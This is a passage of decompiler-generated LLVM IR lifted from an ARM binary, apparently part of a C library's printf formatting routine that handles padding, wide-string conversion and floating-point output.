  %v0_14ba0 = phi i32 [ %v0_14ad0, %bb157 ], [ %v2_14b68, %.thread17 ], [ %v0_14ad0, %dec_label_pc_14b88 ], [ %v0_14ad0, %bb159 ], [ %v0_14ad0, %bb158 ]
  %v3_14b90 = load i32, i32* %stack_var_-348, align 4
  %v1_14b98 = icmp slt i32 %v3_14b90, 0
  br i1 %v1_14b98, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_14b90, %bb160 ]
  %v0_14bc8 = phi i32 [ 1, %bb161 ], [ %v3_14b90, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_14ba0 = and i32 %v0_14ba0, 16
  %v2_14ba0 = icmp eq i32 %v1_14ba0, 0
  %v2_14bac = sub i32 %v2_14b40, %v0_14be4
  store i32 %v2_14bac, i32* @r5, align 4
  br i1 %v2_14ba0, label %bb169, label %dec_label_pc_14bb4

dec_label_pc_14bb4:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_14bb4
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_14bb4, %bb163
  br i1 %v7_14bc0, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_14bc8, %v2_14bac
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_14bcc, label %dec_label_pc_14bd4, label %bb169

dec_label_pc_14bd4:                               ; preds = %bb167
  %v1_14bd4 = inttoptr i32 %v0_14be4 to i8*
  %v2_14bd4 = load i8, i8* %v1_14bd4, align 1
  %v7_14bd8 = icmp eq i8 %v2_14bd4, 48
  br i1 %v7_14bd8, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_14bd4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_14bd4
  %v2_14be0 = add i32 %v2_14bac, 1
  store i32 %v2_14be0, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_14c24 = phi i32 [ %v0_14bc8, %bb167 ], [ %v0_14bc8, %bb162 ], [ 1, %bb168 ], [ %v2_14be0, %.thread24 ], [ %v0_14bc8, %bb166 ]
  %v1_14be4 = inttoptr i32 %v0_14be4 to i8*
  %v2_14be4 = load i8, i8* %v1_14be4, align 1
  %v7_14be8 = icmp eq i8 %v2_14be4, 48
  br i1 %v7_14be8, label %dec_label_pc_14bf0, label %dec_label_pc_14c20

dec_label_pc_14bf0:                               ; preds = %bb169
  %v0_14bf4 = load i32, i32* @r6, align 4
  %v7_14bf8 = icmp slt i32 %v0_14bf4, 6
  br i1 %v7_14bf8, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_14bf0
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_14bf0, %bb170
  br i1 %v7_14b10, label %.thread27, label %dec_label_pc_14c14

.thread27:                                        ; preds = %bb171
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -37232), i32* @r4, align 4
  br label %dec_label_pc_14c2c

dec_label_pc_14c14:                               ; preds = %bb171
  %v2_14c14 = icmp eq i32 %v5_14c24, 0
  br i1 %v2_14c14, label %bb172, label %dec_label_pc_14c20

bb172:                                            ; preds = %dec_label_pc_14c14
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14c2c

dec_label_pc_14c20:                               ; preds = %dec_label_pc_14c14, %bb169
  %v2_14c20 = sub i32 %v5_14c24, %v2_14bac
  %tmp211 = icmp ugt i32 %v5_14c24, %v2_14bac
  br i1 %tmp211, label %.thread85, label %dec_label_pc_14c2c

.thread85:                                        ; preds = %dec_label_pc_14c20
  store i32 %v2_14c20, i32* @r8, align 4
  br label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c20, %.thread27, %bb172
  %v1_14e3c.pre205 = phi i32 [ %v2_14bac, %dec_label_pc_14c20 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14a98
  br i1 %tmp208, label %dec_label_pc_14c74, label %dec_label_pc_14c3c

dec_label_pc_14c3c:                               ; preds = %dec_label_pc_14c34
  %v3_14c4c = load i32, i32* %stack_var_-72, align 4
  %v0_14c50 = load i32, i32* @fp, align 4
  store i32 %v0_14c50, i32* %r0.global-to-local, align 4
  %v1_14c54 = inttoptr i32 %v3_14c4c to i32*
  %v2_14c54 = load i32, i32* %v1_14c54, align 4
  store i32 %v2_14c54, i32* %r2.global-to-local, align 4
  %v3_14c54 = add i32 %v3_14c4c, 4
  %v4_14c54 = inttoptr i32 %v3_14c54 to i32*
  %v5_14c54 = load i32, i32* %v4_14c54, align 4
  %v8_14c58 = call i32 @_fpmaxtostr(i32 %v0_14c50, double bitcast (i64 sext (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -96508) to i64) to double), i32 %v2_14c54, i32 %v5_14c54, i32 %v2_14de8, i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -96508))
  store i32 %v8_14c58, i32* %r0.global-to-local, align 4
  %v1_14c5c = icmp slt i32 %v8_14c58, 0
  br i1 %v1_14c5c, label %dec_label_pc_14f90, label %dec_label_pc_14c64

dec_label_pc_14c64:                               ; preds = %dec_label_pc_14c3c
  %v2_14c68 = add i32 %v8_14c58, %v1_14e68
  store i32 %v2_14c68, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f7c

dec_label_pc_14c74:                               ; preds = %dec_label_pc_14c34
  br i1 %v3_14c78, label %dec_label_pc_14cfc, label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14c74
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_14c84 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14c84, i32* %r0.global-to-local, align 4
  br i1 %v7_14c74, label %dec_label_pc_14c8c, label %dec_label_pc_14cc4

dec_label_pc_14c8c:                               ; preds = %dec_label_pc_14c7c
  %v1_14c8c = inttoptr i32 %v3_14c84 to i32*
  %v2_14c8c = load i32, i32* %v1_14c8c, align 4
  %v9_14c90 = icmp eq i32 %v2_14c8c, 0
  store i32 %v2_14c8c, i32* %stack_var_-44, align 4
  br i1 %v9_14c90, label %dec_label_pc_14d3c, label %dec_label_pc_14c9c

dec_label_pc_14c9c:                               ; preds = %dec_label_pc_14c8c
  %v3_14c9c = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_14ca0, i32* @r0, align 4
  %v4_14ca4 = ashr i32 %v3_14c9c, 31
  %v5_14ca4 = or i32 %v4_14ca4, %v3_14c9c
  store i32 %v5_14ca4, i32* %r2.global-to-local, align 4
  store i32 %v2_14ca0, i32* @r1, align 4
  %v6_14cb0 = call i32 @__GI_wcsrtombs(i32 %v2_14ca0, i32 %v2_14ca0, i32 %v5_14ca4, i32 %v2_14cac, i32 0, i32 %v2_14c8c)
  store i32 %v6_14cb0, i32* %r0.global-to-local, align 4
  %v3_14cb4 = icmp eq i32 %v6_14cb0, -1
  store i32 %v6_14cb0, i32* @r5, align 4
  br i1 %v3_14cb4, label %dec_label_pc_14f90, label %dec_label_pc_14e28

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14c7c
  store i32 %v2_14da4, i32* %r7.global-to-local, align 4
  %v1_14cc8 = inttoptr i32 %v3_14c84 to i32*
  %v2_14cc8 = load i32, i32* %v1_14cc8, align 4
  store i32 %v2_14cac, i32* %r2.global-to-local, align 4
  store i32 %v2_14da4, i32* %r0.global-to-local, align 4
  %v5_14cd4 = call i32 @__GI_wcrtomb(i32 %v2_14da4, i32 %v2_14cc8, i32 %v2_14cac, i32 %tmp105, i32 0)
  store i32 %v5_14cd4, i32* %r0.global-to-local, align 4
  %v7_14cd8 = icmp eq i32 %v5_14cd4, -1
  store i32 %v5_14cd4, i32* @r5, align 4
  br i1 %v7_14cd8, label %dec_label_pc_14f90, label %dec_label_pc_14ce4

dec_label_pc_14ce4:                               ; preds = %dec_label_pc_14cc4
  %v0_14ce4 = load i32, i32* @sl, align 4
  store i32 %v0_14ce4, i32* @r8, align 4
  store i32 %v2_14da4, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_14cf4 = trunc i32 %v0_14ce4 to i8
  %v2_14cf4 = load i32, i32* %r7.global-to-local, align 4
  %v4_14cf4 = add i32 %v2_14cf4, %v5_14cd4
  %v5_14cf4 = inttoptr i32 %v4_14cf4 to i8*
  store i8 %v1_14cf4, i8* %v5_14cf4, align 1
  %v0_14e3c.pre.pre = load i32, i32* @r8, align 4
  %v1_14e3c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14cfc:                               ; preds = %dec_label_pc_14c74
  br i1 %v3_14d00, label %dec_label_pc_14d98, label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14cfc
  %v3_14d04 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14d04, i32* %r0.global-to-local, align 4
  %v1_14d0c = inttoptr i32 %v3_14d04 to i32*
  %v2_14d0c = load i32, i32* %v1_14d0c, align 4
  br i1 %v7_14cfc, label %dec_label_pc_14d0c, label %dec_label_pc_14d70

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14d04
  store i32 %v2_14d0c, i32* @r4, align 4
  %v2_14d10 = icmp eq i32 %v2_14d0c, 0
  br i1 %v2_14d10, label %dec_label_pc_14d3c, label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d0c, %dec_label_pc_14da0
  %v0_14d1c = phi i32 [ %v2_14d0c, %dec_label_pc_14d0c ], [ %v3_14db0, %dec_label_pc_14da0 ]
  %v3_14d18 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_14d1c, i32* %r0.global-to-local, align 4
  %v4_14d20 = ashr i32 %v3_14d18, 31
  %v5_14d20 = or i32 %v4_14d20, %v3_14d18
  %v2_14d24 = inttoptr i32 %v0_14d1c to i8*
  %v3_14d24 = call i32 @strnlen(i8* %v2_14d24, i32 %v5_14d20)
  store i32 %v3_14d24, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_14d24, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14d0c, %dec_label_pc_14c8c
  %v3_14d3c = load i32, i32* %stack_var_-348, align 4
  %v1_14d40 = icmp slt i32 %v3_14d3c, 0
  br i1 %v1_14d40, label %dec_label_pc_14d58, label %dec_label_pc_14d48

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d3c
  %tmp212 = icmp ult i32 %v3_14d3c, 6
  br i1 %tmp212, label %dec_label_pc_14d60, label %dec_label_pc_14d58

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14d3c
  br label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14d58
  %storemerge97 = phi i32 [ 6, %dec_label_pc_14d58 ], [ 0, %dec_label_pc_14d48 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -37224), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d04
  store i32 %v2_14d0c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_14da4, i32* @r4, align 4
  store i32 %v2_14d0c, i32* %stack_var_-200, align 4
  br label %dec_label_pc_14e38thread-pre-split

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14cfc
  br i1 %v7_14d98, label %dec_label_pc_14da0, label %dec_label_pc_14dbc

dec_label_pc_14da0:                               ; preds = %dec_label_pc_14d98
  %v0_14da0 = call i32 @__GI___errno_location()
  store i32 %v0_14da0, i32* %r0.global-to-local, align 4
  %v1_14da8 = inttoptr i32 %v0_14da0 to i32*
  %v2_14da8 = load i32, i32* %v1_14da8, align 4
  store i32 %v2_14da8, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_14db0 = call i32 @__GI___glibc_strerror_r(i32 %v2_14da8, i32 %v2_14da4, i32 128)
  store i32 %v3_14db0, i32* %r0.global-to-local, align 4
  store i32 %v3_14db0, i32* @r4, align 4
  br label %dec_label_pc_14d18

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14d98
  %v4_14dc4 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 860) to i32*), align 4
  %v1_14dcc = add i32 %v4_14dc4, 10
  store i32 %v1_14dcc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14dd0

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14e18, %dec_label_pc_14dbc
  %v1_14de0 = phi i32 [ %v1_14e18, %dec_label_pc_14e18 ], [ %v4_14dc4, %dec_label_pc_14dbc ]
  %v1_14dd0 = inttoptr i32 %v1_14de0 to i8*
  %v2_14dd0 = load i8, i8* %v1_14dd0, align 1
  %v3_14dd0 = zext i8 %v2_14dd0 to i32
  store i32 %v3_14dd0, i32* %r2.global-to-local, align 4
  %v9_14dd8 = icmp eq i32 %v3_14dd0, %tmp99
  br i1 %v9_14dd8, label %dec_label_pc_14de0, label %dec_label_pc_14e18

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14dd0
  %v2_14de0 = sub i32 %v1_14de0, %v4_14dc4
  %v0_14de4 = load i32, i32* @fp, align 4
  store i32 %v0_14de4, i32* %r0.global-to-local, align 4
  store i32 %v2_14dec, i32* %r2.global-to-local, align 4
  %v4_14df4 = mul i32 %v2_14de0, 4
  %v5_14df4 = add i32 %v4_14df4, add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 26404)
  %v6_14df4 = inttoptr i32 %v5_14df4 to i32*
  %v7_14df4 = load i32, i32* %v6_14df4, align 4
  store i32 %v7_14df4, i32* @ip, align 4
  store i32 85504, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14df4)
  %v0_14e00 = load i32, i32* %r0.global-to-local, align 4
  %v1_14e00 = icmp slt i32 %v0_14e00, 0
  br i1 %v1_14e00, label %dec_label_pc_14f90, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14de0
  %v2_14e0c = add i32 %v0_14e00, %v1_14e68
  br label %dec_label_pc_14f7c

dec_label_pc_14e18:                               ; preds = %dec_label_pc_14dd0
  %v1_14e18 = add i32 %v1_14de0, 1
  %v3_14e1c = icmp ult i32 %v1_14e18, %v1_14dcc
  br i1 %v3_14e1c, label %dec_label_pc_14dd0, label %dec_label_pc_14f90

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14c9c
  %v0_14e28 = load i32, i32* @sl, align 4
  store i32 %v0_14e28, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_14e28, i32* @r4, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14e38thread-pre-split:               ; preds = %.thread85, %dec_label_pc_14c2c, %dec_label_pc_14ce4, %dec_label_pc_14d70
  %v1_14e3c.pre = phi i32 [ %v1_14e3c.pre205, %dec_label_pc_14c2c ], [ %v1_14e3c.pre.pre, %dec_label_pc_14ce4 ], [ 1, %dec_label_pc_14d70 ], [ %v2_14bac, %.thread85 ]
  %v0_14e3c.pre = phi i32 [ 0, %dec_label_pc_14c2c ], [ %v0_14e3c.pre.pre, %dec_label_pc_14ce4 ], [ 0, %dec_label_pc_14d70 ], [ %v2_14c20, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_14ba0, %dec_label_pc_14c2c ], [ %v0_14ad0, %dec_label_pc_14ce4 ], [ %v0_14ad0, %dec_label_pc_14d70 ], [ %v0_14ba0, %.thread85 ]
  %v0_14e38.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14e38thread-pre-split, %dec_label_pc_14d60, %dec_label_pc_14d18, %dec_label_pc_14e28
  %v1_14e3c = phi i32 [ %v1_14e3c.pre, %dec_label_pc_14e38thread-pre-split ], [ %storemerge97, %dec_label_pc_14d60 ], [ %v3_14d24, %dec_label_pc_14d18 ], [ %v6_14cb0, %dec_label_pc_14e28 ]
  %v0_14e3c = phi i32 [ %v0_14e3c.pre, %dec_label_pc_14e38thread-pre-split ], [ 0, %dec_label_pc_14d60 ], [ 0, %dec_label_pc_14d18 ], [ %v0_14e28, %dec_label_pc_14e28 ]
  %v0_14e44 = phi i32 [ %v0_14e38.pr, %dec_label_pc_14e38thread-pre-split ], [ 11, %dec_label_pc_14d60 ], [ 11, %dec_label_pc_14d18 ], [ 11, %dec_label_pc_14e28 ]
  %v0_14e84 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_14e38thread-pre-split ], [ %v0_14ad0, %dec_label_pc_14d60 ], [ %v0_14ad0, %dec_label_pc_14d18 ], [ %v0_14ad0, %dec_label_pc_14e28 ]
  %v7_14e38 = icmp eq i32 %v0_14e44, 11
  %v2_14e3c = add i32 %v1_14e3c, %v0_14e3c
  br i1 %v7_14e38, label %dec_label_pc_14e54, label %bb173

bb173:                                            ; preds = %dec_label_pc_14e38
  %v7_14e4c = icmp sgt i32 %v0_14e44, 5
  %. = select i1 %v7_14e4c, i32 2, i32 1
  %v2_14e50 = add i32 %v2_14e3c, %.
  br label %dec_label_pc_14e54

dec_label_pc_14e54:                               ; preds = %dec_label_pc_14e38, %bb173
  %v0_14e68 = phi i32 [ %v2_14e3c, %dec_label_pc_14e38 ], [ %v2_14e50, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_14e58 = icmp uge i32 %tmp98, %v0_14e68
  %v9_14e58 = icmp eq i32 %tmp98, %v0_14e68
  %v2_14e5c = xor i1 %v9_14e58, true
  %v3_14e5c = and i1 %v3_14e58, %v2_14e5c
  br i1 %v3_14e5c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_14e54
  %v2_14e58 = sub i32 %tmp98, %v0_14e68
  store i32 %v2_14e58, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_14e54, %bb174
  store i32 %v1_14e68, i32* %r2.global-to-local, align 4
  %v2_14e64 = xor i1 %v3_14e58, true
  %v3_14e64 = or i1 %v9_14e58, %v2_14e64
  br i1 %v3_14e64, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_14e6c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_14e7c = phi i32 [ %v1_14e6c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_14e68 = add i32 %v0_14e68, %v1_14e68
  %v2_14e6c = add i32 %v2_14e68, %v2_14e7c
  %v0_14e78 = load i32, i32* @sb, align 4
  %v7_14e78 = icmp eq i32 %v0_14e78, 48
  br i1 %v7_14e78, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_14e7c = add i32 %v2_14e7c, %v0_14e3c
  store i32 %v3_14e7c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_14e94 = phi i32 [ %v2_14e7c, %bb177 ], [ 0, %bb178 ]
  %v1_14e84 = and i32 %v0_14e84, 8
  store i32 %v1_14e84, i32* @r7, align 4
  %v2_14e84 = icmp eq i32 %v1_14e84, 0
  br i1 %v2_14e84, label %dec_label_pc_14e8c, label %dec_label_pc_14ea8

dec_label_pc_14e8c:                               ; preds = %.thread30
  %v0_14e8c = load i32, i32* @fp, align 4
  store i32 %v0_14e8c, i32* %r0.global-to-local, align 4
  store i32 %v0_14e94, i32* %r2.global-to-local, align 4
  %v4_14e98 = call i32 @_charpad(i32 %v0_14e8c, i8 32, i32 %v0_14e94)
  store i32 %v4_14e98, i32* %r0.global-to-local, align 4
  %v1_14e9c = load i32, i32* @sl, align 4
  %v9_14e9c = icmp eq i32 %v4_14e98, %v1_14e9c
  br i1 %v9_14e9c, label %dec_label_pc_14ea4, label %dec_label_pc_14f90

dec_label_pc_14ea4:                               ; preds = %dec_label_pc_14e8c
  %v0_14ea4 = load i32, i32* @r7, align 4
  store i32 %v0_14ea4, i32* @sl, align 4
  %v0_14eb0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14ea8

dec_label_pc_14ea8:                               ; preds = %.thread30, %dec_label_pc_14ea4
  %v0_14eb0 = phi i32 [ %v0_14e44, %.thread30 ], [ %v0_14eb0.pre, %dec_label_pc_14ea4 ]
  %v0_14eac = load i32, i32* @fp, align 4
  %v2_14eb0 = add i32 %v0_14eb0, add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -37216)
  store i32 %v2_14eb0, i32* %r0.global-to-local, align 4
  %v2_14eb4 = inttoptr i32 %v2_14eb0 to i8*
  %v3_14eb4 = call i32 @__GI_fputs_unlocked(i8* %v2_14eb4, i32 %v0_14eac)
  %v0_14eb8 = load i32, i32* @fp, align 4
  store i32 %v0_14eb8, i32* %r0.global-to-local, align 4
  %v0_14ec0 = load i32, i32* @r8, align 4
  store i32 %v0_14ec0, i32* %r2.global-to-local, align 4
  %v4_14ec4 = call i32 @_charpad(i32 %v0_14eb8, i8 48, i32 %v0_14ec0)
  store i32 %v4_14ec4, i32* %r0.global-to-local, align 4
  %v1_14ec8 = load i32, i32* @r8, align 4
  %v9_14ec8 = icmp eq i32 %v4_14ec4, %v1_14ec8
  br i1 %v9_14ec8, label %dec_label_pc_14ed0, label %dec_label_pc_14f90

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ea8
  %v3_14ed0 = load i32, i32* %stack_var_-44, align 4
  %v2_14ed4 = icmp eq i32 %v3_14ed0, 0
  br i1 %v2_14ed4, label %dec_label_pc_14edc, label %dec_label_pc_14f00

dec_label_pc_14edc:                               ; preds = %dec_label_pc_14ed0
  %v0_14edc = load i32, i32* @r5, align 4
  %v2_14edc = icmp eq i32 %v0_14edc, 0
  br i1 %v2_14edc, label %dec_label_pc_14f64, label %dec_label_pc_14ee4

dec_label_pc_14ee4:                               ; preds = %dec_label_pc_14edc
  %v0_14ee4 = load i32, i32* @r4, align 4
  store i32 %v0_14ee4, i32* %r0.global-to-local, align 4
  %v0_14eec = load i32, i32* @fp, align 4
  store i32 %v0_14eec, i32* %r2.global-to-local, align 4
  %v3_14ef0 = inttoptr i32 %v0_14eec to i16*
  %v4_14ef0 = call i32 @__stdio_fwrite(i32 %v0_14ee4, i32 %v0_14edc, i16* %v3_14ef0)
  store i32 %v4_14ef0, i32* %r0.global-to-local, align 4
  %v1_14ef4 = load i32, i32* @r5, align 4
  %v9_14ef4 = icmp eq i32 %v4_14ef0, %v1_14ef4
  br i1 %v9_14ef4, label %dec_label_pc_14f64, label %dec_label_pc_14f90

dec_label_pc_14f00:                               ; preds = %dec_label_pc_14ed0
  store i32 %v2_14da4, i32* @r6, align 4
  store i32 %v2_14ca0, i32* @r8, align 4
  store i32 %v2_14cac, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_14f50.pr = load i32, i32* @r5, align 4
  %v2_14f5041 = icmp eq i32 %v0_14f50.pr, 0
  store i32 %v2_14ca0, i32* @r1, align 4
  store i32 %v2_14da4, i32* @r0, align 4
  br i1 %v2_14f5041, label %dec_label_pc_14f64, label %dec_label_pc_14f18

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f00, %dec_label_pc_14f4c
  %v1_14f1c = phi i32 [ %v2_14f4c, %dec_label_pc_14f4c ], [ %v0_14f50.pr, %dec_label_pc_14f00 ]
  %v2_14f18 = icmp ult i32 %v1_14f1c, 128
  %.v1_14f1c = select i1 %v2_14f18, i32 %v1_14f1c, i32 128
  store i32 %.v1_14f1c, i32* %r2.global-to-local, align 4
  %v6_14f24 = call i32 @__GI_wcsrtombs(i32 %v2_14da4, i32 %v2_14ca0, i32 %.v1_14f1c, i32 %v2_14cac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_14f24, i32* @r4, align 4
  %v2_14f28 = icmp eq i32 %v6_14f24, 0
  store i32 %v6_14f24, i32* %r0.global-to-local, align 4
  br i1 %v2_14f28, label %dec_label_pc_14f4c, label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f18
  store i32 %v2_14da4, i32* %r0.global-to-local, align 4
  %v0_14f3c = load i32, i32* @fp, align 4
  store i32 %v0_14f3c, i32* %r2.global-to-local, align 4
  %v3_14f40 = inttoptr i32 %v0_14f3c to i16*
  %v4_14f40 = call i32 @__stdio_fwrite(i32 %v2_14da4, i32 %v6_14f24, i16* %v3_14f40)
  store i32 %v4_14f40, i32* %r0.global-to-local, align 4
  %v1_14f44 = load i32, i32* @r4, align 4
  %v9_14f44 = icmp eq i32 %v4_14f40, %v1_14f44
  br i1 %v9_14f44, label %dec_label_pc_14f4c, label %dec_label_pc_14f90

dec_label_pc_14f4c:                               ; preds = %dec_label_pc_14f34, %dec_label_pc_14f18
  %v0_14f4c = phi i32 [ %v4_14f40, %dec_label_pc_14f34 ], [ 0, %dec_label_pc_14f18 ]
  %v1_14f4c = load i32, i32* @r5, align 4
  %v2_14f4c = sub i32 %v1_14f4c, %v0_14f4c
  store i32 %v2_14f4c, i32* @r5, align 4
  %v2_14f50 = icmp eq i32 %v2_14f4c, 0
  store i32 %v2_14ca0, i32* @r1, align 4
  store i32 %v2_14da4, i32* @r0, align 4
  br i1 %v2_14f50, label %dec_label_pc_14f64, label %dec_label_pc_14f18

dec_label_pc_14f64:                               ; preds = %dec_label_pc_14f4c, %dec_label_pc_14f00, %dec_label_pc_14ee4, %dec_label_pc_14edc
  %v0_14f64 = load i32, i32* @fp, align 4
  store i32 %v0_14f64, i32* %r0.global-to-local, align 4
  %v0_14f6c = load i32, i32* @sl, align 4
  store i32 %v0_14f6c, i32* %r2.global-to-local, align 4
  %v4_14f70 = call i32 @_charpad(i32 %v0_14f64, i8 32, i32 %v0_14f6c)
  store i32 %v4_14f70, i32* %r0.global-to-local, align 4
  %v1_14f74 = load i32, i32* @sl, align 4
  %v9_14f74 = icmp eq i32 %v4_14f70, %v1_14f74
  br i1 %v9_14f74, label %dec_label_pc_14f7c, label %dec_label_pc_14f90

dec_label_pc_14f7c:                               ; preds = %dec_label_pc_14f64, %dec_label_pc_14e08, %dec_label_pc_14c64, %dec_label_pc_14a74
  %stack_var_-336.4 = phi i32 [ %v0_14ad0, %dec_label_pc_14a74 ], [ %v0_14e84, %dec_label_pc_14f64 ], [ %v0_14ad0, %dec_label_pc_14e08 ], [ %v0_14ad0, %dec_label_pc_14c64 ]
  %stack_var_-356.3 = phi i32 [ %v1_14e68, %dec_label_pc_14a74 ], [ %v2_14e6c, %dec_label_pc_14f64 ], [ %v2_14e0c, %dec_label_pc_14e08 ], [ %v2_14c68, %dec_label_pc_14c64 ]
  %v3_14f7c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_14f7c, i32* @r4, align 4
  store i32 %v3_14f7c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1499c.outer

dec_label_pc_14f88:                               ; preds = %dec_label_pc_149f8
  %v1_14f88 = add i32 %v0_14a00, 2
  store i32 %v1_14f88, i32* @r4, align 4
  br label %dec_label_pc_1499c.outer36

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14e18, %dec_label_pc_14c9c, %dec_label_pc_14f64, %dec_label_pc_14ee4, %dec_label_pc_14ea8, %dec_label_pc_14e8c, %dec_label_pc_14de0, %dec_label_pc_14cc4, %dec_label_pc_14c3c, %bb142, %dec_label_pc_14f34
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_14f98

dec_label_pc_14f98:                               ; preds = %dec_label_pc_149ec, %bb, %dec_label_pc_14930, %dec_label_pc_14f90
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_14930 ], [ -1, %dec_label_pc_14f90 ], [ %v1_14e68, %dec_label_pc_149ec ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_148e0, i32* @r5, align 4
  store i32 %v9_148e0, i32* @r6, align 4
  store i32 %v12_148e0, i32* @r7, align 4
  store i32 %v18_148e0, i32* @sb, align 4
  store i32 %v21_148e0, i32* @sl, align 4
  store i32 %v24_148e0, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_14f88, { 1, 0 }
